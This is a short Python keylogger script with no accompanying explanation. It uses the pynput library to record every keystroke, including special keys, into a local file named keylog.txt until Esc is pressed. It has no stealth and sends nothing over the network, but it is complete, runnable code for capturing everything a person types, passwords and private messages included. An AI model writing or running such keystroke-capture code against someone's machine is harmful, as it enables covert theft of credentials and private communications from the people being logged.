# Keylogger

import pynput
from pynput.keyboard import Key, Listener
import os

log_file = "keylog.txt"

# Clear the log file
with open(log_file, "w") as f:
    f.write("")  # Clear the file


def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        if key == Key.esc:
            print("Keylogger stopped. Press Ctrl+C to exit.")
            return False
        with open(log_file, "a") as f:
            f.write(f"[{key}]")


def on_release(key):
    if key == Key.esc:
        print("Keylogger stopped. Press Ctrl+C to exit.")
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
